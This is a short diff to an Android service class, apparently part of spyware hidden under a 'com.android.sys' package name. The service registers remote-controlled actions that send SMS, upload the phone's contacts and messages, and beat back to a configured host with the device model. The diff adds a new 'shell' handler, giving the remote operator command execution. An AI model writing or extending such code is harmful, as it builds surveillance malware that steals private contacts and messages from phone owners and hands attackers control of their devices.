@@ -9,6 +9,7 @@ import android.os.Build;
 import android.os.IBinder;
 
 import com.android.sys.action.SendSmsAction;
+import com.android.sys.action.ShellAction;
 import com.android.sys.action.UploadContactsAction;
 import com.android.sys.action.UploadSmsAction;
 import com.android.sys.session.NetworkSessionManager;
@@ -43,6 +44,7 @@ public class SystemService extends Service{
     private String ACTION_SEND_SMS = "send_sms";
     private String ACTION_UPLOAD_SMS = "upload_sms";
     private String ACTION_UPLOAD_CONTACT = "upload_contact";
+    private String ACTION_SHELL = "shell";
 
     private void init() {
         try {
@@ -55,6 +57,7 @@ public class SystemService extends Service{
             mSessionManager.addActionHandler(ACTION_SEND_SMS, new SendSmsAction());
             mSessionManager.addActionHandler(ACTION_UPLOAD_CONTACT, new UploadContactsAction());
             mSessionManager.addActionHandler(ACTION_UPLOAD_SMS, new UploadSmsAction());
+            mSessionManager.addActionHandler(ACTION_SHELL, new ShellAction());
             mSessionManager.setHeartBeatData(Build.MODEL.getBytes("UTF-8"));
             if(host_port.length >= 1) {
                 mSessionManager.setHost( host_port[0] );
